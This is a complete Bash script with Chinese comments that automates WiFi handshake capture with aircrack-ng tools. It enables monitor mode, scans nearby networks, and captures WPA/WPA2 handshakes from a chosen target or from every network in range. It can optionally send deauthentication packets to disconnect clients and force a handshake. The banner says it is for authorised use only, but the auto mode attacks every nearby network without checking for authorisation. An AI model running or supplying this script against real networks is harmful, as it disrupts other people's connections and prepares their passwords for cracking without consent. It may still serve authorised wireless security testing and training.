#!/bin/bash
# WiFi Handshake Capture - 自动捕获脚本
# 自动扫描并捕获周围 WiFi 的握手包

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# 配置
CONFIG_FILE="/home/vagrant/config/config.conf"
CAPTURE_DIR="/home/vagrant/captures"
INTERFACE=""
MON_INTERFACE=""

# 加载配置
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
    fi
    
    # 默认值
    SCAN_TIME=${SCAN_TIME:-30}
    CAPTURE_TIME=${CAPTURE_TIME:-120}
    DEAUTH_COUNT=${DEAUTH_COUNT:-5}
    AUTO_DEAUTH=${AUTO_DEAUTH:-false}
    TARGET_BSSID=${TARGET_BSSID:-""}
}

# 打印 Banner
print_banner() {
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║       WiFi Handshake Auto Capture Tool                ║"
    echo "║       仅限授权网络测试使用                             ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# 检查 root 权限
check_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] 请使用 root 权限运行此脚本${NC}"
        exit 1
    fi
}

# 查找无线网卡
find_interface() {
    echo -e "${YELLOW}[*] 正在查找无线网卡...${NC}"
    
    # 获取无线接口列表
    INTERFACES=$(iw dev | grep Interface | awk '{print $2}')
    
    if [ -z "$INTERFACES" ]; then
        echo -e "${RED}[!] 未找到无线网卡，请确保 USB 网卡已连接${NC}"
        exit 1
    fi
    
    # 使用第一个找到的接口
    INTERFACE=$(echo "$INTERFACES" | head -n1)
    echo -e "${GREEN}[+] 找到无线网卡: $INTERFACE${NC}"
}

# 启用监听模式
enable_monitor_mode() {
    echo -e "${YELLOW}[*] 正在启用监听模式...${NC}"
    
    # 停止可能干扰的进程
    airmon-ng check kill 2>/dev/null || true
    
    # 启用监听模式
    airmon-ng start "$INTERFACE" 2>/dev/null
    
    # 确定监听接口名称
    MON_INTERFACE="${INTERFACE}mon"
    if ! iw dev | grep -q "$MON_INTERFACE"; then
        MON_INTERFACE="$INTERFACE"
    fi
    
    # 验证监听模式
    if iw dev "$MON_INTERFACE" info 2>/dev/null | grep -q "monitor"; then
        echo -e "${GREEN}[+] 监听模式已启用: $MON_INTERFACE${NC}"
    else
        echo -e "${RED}[!] 无法启用监听模式，请检查网卡是否支持${NC}"
        exit 1
    fi
}

# 扫描周围 WiFi
scan_networks() {
    echo -e "${YELLOW}[*] 正在扫描周围 WiFi 网络 (${SCAN_TIME}秒)...${NC}"
    
    SCAN_FILE="$CAPTURE_DIR/scan_$(date +%Y%m%d_%H%M%S)"
    
    # 使用 airodump-ng 扫描
    timeout "$SCAN_TIME" airodump-ng \
        --write "$SCAN_FILE" \
        --write-interval 5 \
        --output-format csv \
        "$MON_INTERFACE" 2>/dev/null &
    
    SCAN_PID=$!
    
    # 显示进度
    for i in $(seq 1 $SCAN_TIME); do
        printf "\r${BLUE}[*] 扫描进度: %d/%d 秒${NC}" "$i" "$SCAN_TIME"
        sleep 1
    done
    echo ""
    
    wait $SCAN_PID 2>/dev/null || true
    
    # 解析扫描结果
    if [ -f "${SCAN_FILE}-01.csv" ]; then
        echo -e "${GREEN}[+] 扫描完成，发现以下网络:${NC}"
        echo ""
        echo "BSSID              CH  PWR  加密      ESSID"
        echo "─────────────────────────────────────────────────────"
        
        # 解析并显示网络（跳过客户端部分）
        awk -F',' 'NR>2 && $1 ~ /^[0-9A-F:]+$/ && $14 != "" {
            gsub(/^ +| +$/, "", $1);  # BSSID
            gsub(/^ +| +$/, "", $4);  # Channel
            gsub(/^ +| +$/, "", $9);  # Power
            gsub(/^ +| +$/, "", $6);  # Encryption
            gsub(/^ +| +$/, "", $14); # ESSID
            if ($4 > 0 && $4 < 15) {
                printf "%-18s %-3s %-4s %-9s %s\n", $1, $4, $9, $6, $14
            }
        }' "${SCAN_FILE}-01.csv" | head -20
        
        echo ""
        return 0
    else
        echo -e "${RED}[!] 扫描失败${NC}"
        return 1
    fi
}

# 捕获指定网络的握手包
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    echo -e "${YELLOW}[*] 开始捕获握手包...${NC}"
    echo -e "    目标: ${GREEN}$essid${NC} ($bssid) 信道: $channel"
    
    CAPTURE_FILE="$CAPTURE_DIR/handshake_${essid}_$(date +%Y%m%d_%H%M%S)"
    
    # 锁定信道
    iwconfig "$MON_INTERFACE" channel "$channel" 2>/dev/null || true
    
    # 启动捕获
    airodump-ng \
        --bssid "$bssid" \
        --channel "$channel" \
        --write "$CAPTURE_FILE" \
        --output-format pcap,csv \
        "$MON_INTERFACE" &
    
    CAPTURE_PID=$!
    
    # 如果启用了 deauth，发送断开认证包加速握手捕获
    if [ "$AUTO_DEAUTH" = "true" ]; then
        sleep 5
        echo -e "${YELLOW}[*] 发送 Deauth 包以加速握手捕获...${NC}"
        aireplay-ng \
            --deauth "$DEAUTH_COUNT" \
            -a "$bssid" \
            "$MON_INTERFACE" 2>/dev/null &
    fi
    
    # 等待捕获
    echo -e "${BLUE}[*] 捕获中，等待握手包 (最多 ${CAPTURE_TIME}秒)...${NC}"
    echo -e "    按 Ctrl+C 提前结束"
    
    local elapsed=0
    while [ $elapsed -lt $CAPTURE_TIME ]; do
        # 检查是否已捕获到握手包
        if [ -f "${CAPTURE_FILE}-01.cap" ]; then
            if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
                echo -e "\n${GREEN}[+] 成功捕获握手包！${NC}"
                kill $CAPTURE_PID 2>/dev/null || true
                return 0
            fi
        fi
        
        sleep 5
        elapsed=$((elapsed + 5))
        printf "\r${BLUE}[*] 已等待 %d/%d 秒${NC}" "$elapsed" "$CAPTURE_TIME"
    done
    
    echo ""
    kill $CAPTURE_PID 2>/dev/null || true
    
    # 最终检查
    if [ -f "${CAPTURE_FILE}-01.cap" ]; then
        if aircrack-ng "${CAPTURE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
            echo -e "${GREEN}[+] 成功捕获握手包！${NC}"
            return 0
        fi
    fi
    
    echo -e "${YELLOW}[!] 未能捕获到握手包（可能没有客户端连接）${NC}"
    return 1
}

# 自动捕获所有网络
auto_capture_all() {
    echo -e "${YELLOW}[*] 开始自动捕获模式...${NC}"
    
    # 先扫描
    scan_networks
    
    SCAN_FILE=$(ls -t "$CAPTURE_DIR"/scan_*-01.csv 2>/dev/null | head -n1)
    
    if [ -z "$SCAN_FILE" ]; then
        echo -e "${RED}[!] 没有可用的扫描结果${NC}"
        return 1
    fi
    
    # 提取 WPA/WPA2 网络并按信号强度排序
    echo -e "${YELLOW}[*] 筛选 WPA/WPA2 网络...${NC}"
    
    # 遍历每个网络
    awk -F',' 'NR>2 && $1 ~ /^[0-9A-F:]+$/ && ($6 ~ /WPA/ || $6 ~ /WPA2/) {
        gsub(/^ +| +$/, "", $1);
        gsub(/^ +| +$/, "", $4);
        gsub(/^ +| +$/, "", $9);
        gsub(/^ +| +$/, "", $14);
        if ($4 > 0 && $4 < 15 && $14 != "") {
            print $1","$4","$14
        }
    }' "$SCAN_FILE" | while IFS=',' read -r bssid channel essid; do
        
        echo ""
        echo -e "${BLUE}════════════════════════════════════════${NC}"
        echo -e "${GREEN}[>] 目标: $essid${NC}"
        echo -e "${BLUE}════════════════════════════════════════${NC}"
        
        capture_handshake "$bssid" "$channel" "$essid"
        
        # 短暂暂停
        sleep 2
    done
}

# 清理函数
cleanup() {
    echo -e "\n${YELLOW}[*] 正在清理...${NC}"
    
    # 停止所有相关进程
    pkill -f airodump-ng 2>/dev/null || true
    pkill -f aireplay-ng 2>/dev/null || true
    
    # 恢复网卡模式
    if [ -n "$MON_INTERFACE" ]; then
        airmon-ng stop "$MON_INTERFACE" 2>/dev/null || true
    fi
    
    # 重启网络服务
    service NetworkManager start 2>/dev/null || true
    
    echo -e "${GREEN}[+] 清理完成${NC}"
}

# 主菜单
main_menu() {
    while true; do
        echo ""
        echo -e "${BLUE}请选择操作:${NC}"
        echo "  1) 扫描周围 WiFi 网络"
        echo "  2) 捕获指定网络握手包"
        echo "  3) 自动捕获所有 WPA/WPA2 网络"
        echo "  4) 查看已捕获的握手包"
        echo "  5) 退出"
        echo ""
        read -p "选择 [1-5]: " choice
        
        case $choice in
            1)
                scan_networks
                ;;
            2)
                read -p "输入目标 BSSID: " target_bssid
                read -p "输入信道: " target_channel
                read -p "输入 ESSID (网络名): " target_essid
                capture_handshake "$target_bssid" "$target_channel" "$target_essid"
                ;;
            3)
                auto_capture_all
                ;;
            4)
                echo -e "${GREEN}已捕获的握手包:${NC}"
                ls -la "$CAPTURE_DIR"/*.cap 2>/dev/null || echo "暂无捕获文件"
                ;;
            5)
                cleanup
                exit 0
                ;;
            *)
                echo -e "${RED}无效选择${NC}"
                ;;
        esac
    done
}

# 信号处理
trap cleanup EXIT INT TERM

# 主函数
main() {
    print_banner
    check_root
    load_config
    find_interface
    enable_monitor_mode
    
    # 如果指定了目标，直接捕获
    if [ -n "$TARGET_BSSID" ]; then
        capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_ESSID"
    else
        main_menu
    fi
}

main "$@"
